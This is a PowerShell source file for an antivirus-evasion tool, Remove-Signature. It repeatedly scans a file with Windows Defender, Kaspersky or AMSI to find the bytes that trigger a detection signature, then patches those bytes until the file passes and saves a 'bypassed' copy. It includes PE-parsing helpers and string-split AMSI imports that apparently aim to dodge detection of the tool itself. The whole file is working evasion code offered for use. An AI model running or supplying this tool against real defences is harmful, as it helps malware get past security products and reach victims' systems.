function Remove-Signature {
  param(
    [Parameter(Mandatory = $true)]
    [string]$Path,
    [string]$AvProduct = "Defender",
    [switch]$Force
  )

  # parse argument
  $Path = Resolve-Path $Path
  if (!(Test-Path $Path)) {
    [Console]::WriteLine("[-] specified file doesn't exist")
    return
  }

  $Av = 0
  switch -Exact ($AvProduct)
  {
    "Defender" {$Av = [Defender]::new(); break}
    "Kaspersky" {$Av = [Kaspersky]::new(); break}
    "Amsi" {$Av = [Amsi]::new(); break}
    default {[Console]::WriteLine("[-] specified AV product doesn't exist. specify Defender, Kaspersky or Amsi");return}
  }

  $Signature = [Signature]::new($Av)
  $Signature.Scan($Path, $Force)
}

class Signature {
  [Object] $Av = 0

  Signature([Object]$Av){
    $this.Av = $Av
  }

  [void] Print ($Bytes, $LastGoodOffset) {
    # to-do: process files smaller than 256 bytes
    [uint32]$StartOffset = $LastGoodOffset - 128
    [uint32]$EndOffset = $LastGoodOffset + 128
    if ($Bytes.Length -lt $EndOffset) {
      $EndOffset = $Bytes.Length
    }

    # retrieve bytes to be printed out
    $BytesToPrint = $Bytes[$StartOffset..($EndOffset - 1)]
    $i = 0
    foreach ($Byte in $BytesToPrint) {
      # printing offset before printing first byte and when printing 16th bytes
      if (($i % 16) -eq 0) {
        [Console]::WriteLine("")
        $Offset = [Util]::ToHexString($i + $StartOffset,8)
        if (($i + $StartOffset) -eq $LastGoodOffset) {
          Write-Host -NoNewline $Offset -ForegroundColor DarkYellow
        } else {
          Write-Host -NoNewline $Offset
        }
      }
      # printing hex value of byte
      Write-Host -NoNewline " $([Util]::ToHexString($Byte, 2))"

      # printing ascii before 16th hex bytes
      if ($i -and (($i + 1) % 16 -eq 0)) {
        Write-Host -NoNewline " "
        foreach ($AsciiByte in $BytesToPrint[($i - 15)..$i]) {
          if (($AsciiByte -eq 0x0a) -or ($AsciiByte -eq 0x0d) -or ($AsciiByte -eq 0x09) -or ($AsciiByte -eq 0x00)) {
            Write-Host -NoNewline " "
          } else {
            $Char = ([System.Text.Encoding]::ASCII.GetString($AsciiByte))
            Write-Host -NoNewline $Char
          }
        }
      }
      $i++
    }
    [Console]::WriteLine("")
  }

  [void] Scan ($Path, $Force) {
    $Bytes = [System.IO.File]::ReadAllBytes($Path)
    if (!$this.Av.IsMalicious($Bytes)) {
      [Console]::WriteLine("[*] $Path has no malicious signature")
      return
    }

    $Item = Get-Item $Path
    $OutFile = "$($item.Directory)\bypassed.$($item.Name)"

    [Console]::WriteLine("[*] $($item.Name) has malicious signature. start scanning $($Bytes.Length) bytes...")    
    $SplitEndOffset = [math]::Floor($Bytes.Length / 2)
    $LastGoodOffset = 0

    while ($true) {
      $SplittedBytes = $Bytes[0..$SplitEndOffset]
      if ($this.Av.IsMalicious($SplittedBytes)) {
        Write-Host -NoNewline '.'
        $SplitEndOffset = [math]::Floor(($SplitEndOffset - $LastGoodOffset) / 2) + $LastGoodOffset
        if ($SplittedBytes.Length -eq ($SplitEndOffset + 2)) {
          $SignatureOffset = $SplitEndOffset + 2

          [Console]::WriteLine("`n[*] located a signature around $([Util]::ToHexString($SignatureOffset, 8))")
          $this.Print($Bytes,$SignatureOffset)

          if (!$this.IsChangeableOffset($Path, $SignatureOffset) -and !$Force) {
            [Console]::WriteLine("[*] we will stop removing signatures here...")
            break
          }
          $Bytes = $this.Remove($Bytes, $SignatureOffset)

          [Console]::WriteLine("[*] should be changed as follow to bypass the signature")
          $this.Print($Bytes, $SignatureOffset)
          if ($this.Av.IsMalicious($Bytes)) {
            [Console]::WriteLine("[*] there should be another signature in file. scan again ...")
          } else {
            [System.IO.File]::WriteAllBytes($OutFile, $Bytes)
            [Console]::WriteLine("[+] removed all signatures. here is the output: $OutFile")
            break
          }
        }
      } else {
        $LastGoodOffset = $SplitEndOffset
        $SplitEndOffset = [math]::Floor(($Bytes.Length - $LastGoodOffset - 1) / 2) + $LastGoodOffset

        if ($LastGoodOffset -eq $SplitEndOffset) {
          [Console]::WriteLine("[+] maybe file hash is the signature")
          $Bytes[$Bytes.Length - 1] = 0x90          
          if ($this.Av.IsMalicious($Bytes)) {
            [Console]::WriteLine("[-] appending nop code cannot bypasse the signature...")
          } else {
            [System.IO.File]::WriteAllBytes($OutFile, $Bytes)
            [Console]::WriteLine("[+] appending nop code at the end bypassed the signature. here is the output : $OutFile")
          }
          break
        }
      }
    }
    return
  }

  [Byte[]] Remove ($OriginalBytes, $SignatureOffset) {
    $i = 0
    while ($true) {
      $SplittedBytes = $OriginalBytes[0..$SignatureOffset]
      if ($SplittedBytes[$SignatureOffset - $i] -ne 0x00) {

        $SplittedBytes[$SignatureOffset - $i] = 0x41
        if (!$this.Av.IsMalicious($SplittedBytes)) {
          break
        }
      }
      $i++
    }
    $OriginalBytes[$SignatureOffset - $i] = 0x41
    return $OriginalBytes
  }

  [bool] IsChangeableOffset ($Path,$Offset) {
    $PEParser = [PEParser]::new()
    if (!$PEParser.Load($Path)) {
      # if it is not a pe file, then we can think any byte can be overwrritten
      return $true
    }

    if ($PEParser.IsDotNetAssembly()) {
      # to-do: support parsing .net assembly to identify where we can change in its file
      return $true
    }

    $SignatureSection = $PEParser.LocateSectionsByOffset($Offset)
    if ($SignatureSection -eq '.text') {
      [Console]::WriteLine("[-] changing .text section would corrupt your file. consider changing its code by yourself")
      return $false
    }

    if ($PEParser.IsAtInt($Offset)) {
      [Console]::WriteLine("[-] changing a byte at Import Name Table area would corrupt your file. consider changing its code by yourself")
      return $false
    }

    return $true
  }
}

class Defender {
  [bool] IsMalicious ($Bytes) {
    $TempFilePath = [System.IO.Path]::GetTempFileName()
    $Outfile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllBytes($TempFilePath, $Bytes)

    Start-Process -FilePath "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -ArgumentList "-Scan -ScanType 3 -File ${TempFilePath} -DisableRemediation -Trace -Level 0x10" -RedirectStandardOutput $Outfile -NoNewWindow -Wait
    $ResultBytes = [System.IO.File]::ReadAllBytes($Outfile)
    $ResultText = [System.Text.Encoding]::ASCII.GetString($ResultBytes)
    Remove-Item $Outfile
    Remove-Item $TempFilePath
    if ($ResultText.IndexOf('found no threats') -gt -1) {
      return $false
    }
    return $true
  }
}

class Kaspersky{
  [bool] IsMalicious ($Bytes) {
    $TempFilePath = [System.IO.Path]::GetTempFileName()
    $Outfile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllBytes($TempFilePath, $Bytes)

    Start-Process -FilePath "C:\\Program Files (x86)\\Kaspersky Lab\\Kaspersky 21.9\\avp.com" -ArgumentList "SCAN ${TempFilePath}" -RedirectStandardOutput $Outfile -NoNewWindow -Wait
    $ResultBytes = [System.IO.File]::ReadAllBytes($Outfile)
    $ResultText = [System.Text.Encoding]::ASCII.GetString($ResultBytes)
    Remove-Item $Outfile
    Remove-Item $TempFilePath
    if ($ResultText.IndexOf('deleted') -gt -1) {
      return $true
    }
    return $false
  }
}

class Amsi{
    [bool] IsMalicious ($Bytes) {
        $def = 
@"
        [DllImport("amsi.dll", EntryPoint = "AmsiInitialize", CallingConvention = CallingConvention.StdCall)]
        public static extern int Initialize([MarshalAs(UnmanagedType.LPWStr)] string appName, out IntPtr context);

        [DllImport("amsi.dll", EntryPoint = "AmsiOpenSession", CallingConvention = CallingConvention.StdCall)]
        public static extern int OpenSession(IntPtr context, out IntPtr session);

        [DllImport("amsi.dll", EntryPoint = "AmsiCl" + "oseSession", CallingConvention = CallingConvention.StdCall)]
        public static extern void CloseSession(IntPtr context, IntPtr session);

        [DllImport("amsi.dll", EntryPoint = "AmsiUn" + "initialize", CallingConvention = CallingConvention.StdCall)]
        public static extern void Uninitialize(IntPtr context);

        [DllImport("amsi.dll", EntryPoint = "AmsiSc" + "anBuffer", CallingConvention = CallingConvention.StdCall)]
        public static extern int Scan(IntPtr context, byte[] buffer, uint length, string contentName, IntPtr session, out IntPtr result);        
"@
        $amsi = add-type -memberDefinition $def -name "Amsi" -passthru
        $context = 0
        $session = 0
        $result = 0        
        $amsi::Initialize("Remove-Signature", [ref]$context)
        $amsi::OpenSession($context, [ref]$session)
        $amsi::Scan($context, $Bytes, $bytes.Length, "sample", $session, [ref]$result)
        $amsi::CloseSession($context, $session)
        $amsi::Uninitialize($context)
        if ($result -eq 32768) {
            return $true
        }
        return $false
    }
}

class Util{
  static [string] ToHexString ([uint64]$Integer,$PaddingNum) {
    $HexString = ("{0:x$($PaddingNum)}" -f $Integer)
    return $HexString
  }

  static [char] ReverseCase ([char]$Char) {
    if ($Char -cmatch "[A-Z]") {
      [int]$Char += 0x20
      return $Char
    } elseif ($Char -cmatch "[a-z]") {
      [int]$Char -= 0x20
      return $Char
    }
    return $Char
  }
}

class PEParser{
  # DOS header
  [uint16]$DOS_SIGNATURE = 0x5a4d
  [uint32]$E_LFANEW_OFFSET = 0x3c # e_flanew = imagebase + 0x3c; 
  # NT header
  [uint32]$NT_SIGNATURE = 0x00004550
  [uint32]$NUMBER_OF_SECTIONS_OFFSET = 0x6 # numOfSections = imagebase + e_flanew + 0x6
  [uint32]$SIZE_OF_OPTIONAL_HEADER_OFFSET = 0x14 # sizeOfOptionalHeader = imagebase + e_flanew + 0x14
  [uint32]$OPTIONAL_HEADER_OFFSET = 0x18 # optinalHeader = imagebase + e_flanew + 0x18
  # Optional header
  [uint16]$OPTIONAL_HDR32_MAGIC = 0x10b
  [uint16]$OPTIONAL_HDR64_MAGIC = 0x20b
  [uint32]$IMAGE_BASE_OFFSET32 = 0x1c
  [uint32]$IMAGE_BASE_OFFSET64 = 0x18
  [uint32]$SIZE_OF_HEADERS_OFFSET = 0x3C
  [uint32]$DATA_DIRECTORY_OFFSET32 = 0x60
  [uint32]$DATA_DIRECTORY_OFFSET64 = 0x70
  # data directory
  [uint32]$DATA_DIRECTORY_SIZE = 0x8
  [uint32]$DATA_DIRECTORY_VIRTUAL_ADDRESS_OFFSET = 0x0 # dataDirectory.VirtualAddress = dataDirectory + size*index + 0x0
  [uint32]$DATA_DIRECTORY_SIZE_OFFSET = 0x4
  # Section header
  [uint32]$SECTION_VIRTUAL_SIZE_OFFSET = 0x8
  [uint32]$SECTION_VIRTUAL_ADDRESS_OFFSET = 0xc
  [uint32]$SIZE_OF_RAW_DATA_OFFSET = 0x10 # sizeOfRawData = sectionHdr + 0x10
  [uint32]$POINTER_TO_RAW_DATA_OFFSET = 0x14 # ptrToRawData = sectionHdr + 0x14
  [uint16]$SIZE_OF_SECTION_HEADER = 40
  # Import Descriptor
  [uint32]$IMPORT_DESCRIPTOR_NAME_OFFSET = 0xc
  [uint32]$IMPORT_DESCRIPTOR_SIZE = 20
  [int32]$IMAGE_ORDINAL_FLAG32 = 0x80000000
  [int64]$IMAGE_ORDINAL_FLAG64 = 0x8000000000000000

  [string]$Path
  [byte[]]$Bytes
  [uint32]$NtHeader
  [uint32]$OptionalHeader
  [bool]$isPe32 = $false
  [bool]$isPe64 = $false

  [bool] Load ($Path) {
    $this.Path = $Path
    $this.Bytes = [System.IO.File]::ReadAllBytes($this.Path)

    # parse DOS header
    $DosSignature = $this.ReadUint16(0)
    if ($DosSignature -ne $this.DOS_SIGNATURE) {
      return $false
    }

    # parse PE header (NT_HEADER = DOS_HEADER->e_lfanew)
    $this.NtHeader = $this.ReadUint32($this.E_LFANEW_OFFSET)
    $NtSignature = $this.ReadUint32($this.NtHeader)
    if ($NtSignature -ne $this.NT_SIGNATURE) {
      return $false
    }

    $this.OptionalHeader = $this.NtHeader + $this.OPTIONAL_HEADER_OFFSET
    $OptionalHeaderMagic = $this.ReadUint16($this.OptionalHeader)

    switch ($OptionalHeaderMagic) {
      $this.OPTIONAL_HDR32_MAGIC {
        $this.isPe32 = $true
      }
      $this.OPTIONAL_HDR64_MAGIC {
        $this.isPe64 = $true
      }
      default {
        # not supported pe format
        return $false
      }
    }

    return $true
  }

  [uint32] FindFirstSection () {
    $SizeOfOptionalHeader = $this.ReadUint16($this.NtHeader + $this.SIZE_OF_OPTIONAL_HEADER_OFFSET)
    $FirstSectionOffset = $this.OptionalHeader + $SizeOfOptionalHeader
    return $FirstSectionOffset
  }

  [uint16] GetSectionNumber () {
    return $this.ReadUint16($this.NtHeader + $this.NUMBER_OF_SECTIONS_OFFSET)
  }

  [void] EnumSection () {
    $ThisSectionOffset = $this.FindFirstSection()
    for ($i = 0; $i -lt $this.GetSectionNumber(); $i++) {
      $SectionStart = $this.ReadUint32($ThisSectionOffset + $this.POINTER_TO_RAW_DATA_OFFSET)
      $SectionEnd = $SectionStart + $this.ReadUint32($ThisSectionOffset + $this.SIZE_OF_RAW_DATA_OFFSET)
      [Console]::WriteLine("$($i+1) $($this.ReadString($ThisSectionOffset)) section at $SectionStart -  $SectionEnd")
      $ThisSectionOffset += $this.SIZE_OF_SECTION_HEADER
    }
    return
  }

  [string] LocateSectionsByOffset ($Offset) {
    $ThisSectionOffset = $this.FindFirstSection()
    for ($i = 0; $i -lt $this.GetSectionNumber(); $i++) {
      $SectionStart = $this.ReadUint32($ThisSectionOffset + $this.POINTER_TO_RAW_DATA_OFFSET)
      $SectionEnd = $SectionStart + $this.ReadUint32($ThisSectionOffset + $this.SIZE_OF_RAW_DATA_OFFSET)
      if (($Offset -ge $SectionStart) -and ($Offset -le $SectionEnd)) {
        return $this.ReadString($ThisSectionOffset)
      }
      $ThisSectionOffset += $this.SIZE_OF_SECTION_HEADER
    }
    return "unknown"
  }

  [bool] IsAtInt ($Offset) {

    $DataDirOffset = $this.DATA_DIRECTORY_OFFSET32
    if ($this.isPe64) {
      $DataDirOffset = $this.DATA_DIRECTORY_OFFSET64
    }

    # locate .idata section where import table is at
    $ImportDescriptorVirtualAddress = $this.ReadUint32($this.OptionalHeader + $DataDirOffset + 8)
    $ImportDescriptor = $this.GetImportDescriptor()
    $Delta = $ImportDescriptor - $ImportDescriptorVirtualAddress

    while ($true) {
      $ImportDllNameVirtualAddress = $this.ReadUint32($ImportDescriptor + $this.IMPORT_DESCRIPTOR_NAME_OFFSET)
      if (!$ImportDllNameVirtualAddress) {
        break
      }
      $ImportDllName = $ImportDllNameVirtualAddress + $Delta
      $OriginalFirstThunk = $this.ReadUint32($ImportDescriptor) + $Delta
      $StartIntEntry = 0
      while ($true) {
        if ($this.isPe32) {
          $ImportNameTableVirtualAddress = $this.ReadUint32($OriginalFirstThunk)
          [int32]$OrdinalFlag = $this.IMAGE_ORDINAL_FLAG32
          $ToNextOffset = 4
        } else {
          $ImportNameTableVirtualAddress = $this.ReadUint64($OriginalFirstThunk)
          [int64]$OrdinalFlag = $this.IMAGE_ORDINAL_FLAG64
          $ToNextOffset = 8
        }

        if (!$ImportNameTableVirtualAddress -or ($ImportNameTableVirtualAddress -band $OrdinalFlag)) {
          # if OriginalFirstThunk.u1.AddressOfData = 0, then it is end of originalfirstthunk linked with int entry
          # also if addressofdata's 4th or 8th bit flagged, then no int
          break
        }

        $ImportNameTable = $ImportNameTableVirtualAddress + $Delta
        if (!$StartIntEntry) {
          $StartIntEntry = $ImportNameTable
        }
        elseif ($StartIntEntry -gt $ImportNameTable) {
          $StartIntEntry = $ImportNameTable
        }
        $OriginalFirstThunk += $ToNextOffset
      }

      if ($StartIntEntry) {
        if (($Offset -ge $StartIntEntry) -and ($Offset -lt $ImportDllName)) {
          return $true
        }
      }
      $ImportDescriptor += $this.IMPORT_DESCRIPTOR_SIZE
    }
    return $false
  }

  [uint64] GetImportDescriptor () {

    $DataDirOffset = $this.DATA_DIRECTORY_OFFSET32
    if ($this.isPe64) {
      $DataDirOffset = $this.DATA_DIRECTORY_OFFSET64
    }

    # access import data directory via dataDirectory[1].VirtualAddress, .Size
    $ImportDescriptorVirtualAddress = $this.ReadUint32($this.OptionalHeader + $DataDirOffset + $this.DATA_DIRECTORY_SIZE * 1 + $this.DATA_DIRECTORY_VIRTUAL_ADDRESS_OFFSET)

    # locate .idata section where import table is at
    $ThisSectionOffset = $this.FindFirstSection()
    $SectionVirtualAddr = 0
    $SectionRawAddr = 0
    for ($i = 0; $i -lt $this.GetSectionNumber(); $i++) {
      $SectionVirtualAddr = $this.ReadUint32($ThisSectionOffset + $this.SECTION_VIRTUAL_ADDRESS_OFFSET)
      $SectionVirtualSize = $this.ReadUint32($ThisSectionOffset + $this.SECTION_VIRTUAL_SIZE_OFFSET)
      $SectionRawAddr = $this.ReadUint32($ThisSectionOffset + $this.POINTER_TO_RAW_DATA_OFFSET)
      if (($ImportDescriptorVirtualAddress -ge $SectionVirtualAddr) -and ($ImportDescriptorVirtualAddress -lt ($SectionVirtualAddr + $SectionVirtualSize))) {
        break
      }
      $ThisSectionOffset += $this.SIZE_OF_SECTION_HEADER
    }

    $ImportDescriptor = $SectionRawAddr + ($ImportDescriptorVirtualAddress - $SectionVirtualAddr)
    return $ImportDescriptor
  }

  [uint64] IsDotNetAssembly() {
    $DataDirOffset = $this.DATA_DIRECTORY_OFFSET32
    if ($this.isPe64) {
      $DataDirOffset = $this.DATA_DIRECTORY_OFFSET64
    }

    # access import data directory via dataDirectory[13]].VirtualAddress
    $CLRHeaderVirtualAddress = $this.ReadUint32($this.OptionalHeader + $DataDirOffset + $this.DATA_DIRECTORY_SIZE * 14 + $this.DATA_DIRECTORY_VIRTUAL_ADDRESS_OFFSET)
    if ($CLRHeaderVirtualAddress) {
      return $true
    }
    return $false
  }

  [uint16] ReadUint16 ($Offset) {
    $Uint16Bytes = $this.Bytes[$Offset..($Offset + 2 - 1)]
    return [System.BitConverter]::ToUInt16($Uint16Bytes,0)
  }

  [uint32] ReadUint32 ($Offset) {
    $Uint32Bytes = $this.Bytes[$Offset..($Offset + 4 - 1)]
    return [System.BitConverter]::ToUInt32($Uint32Bytes,0)
  }

  [uint64] ReadUint64 ($Offset) {
    $Uint64Bytes = $this.Bytes[$Offset..($Offset + 8 - 1)]
    return [System.BitConverter]::ToUInt64($Uint64Bytes,0)
  }

  [string] ReadString ($Offset) {
    $i = 0
    while ($true) {
      if ($this.Bytes[$Offset + $i] -eq 0) {
        break
      }
      $i++
    }
    $StringBytes = $this.Bytes[$Offset..($Offset + $i)]
    return [System.Text.Encoding]::ASCII.GetString($StringBytes)
  }
}
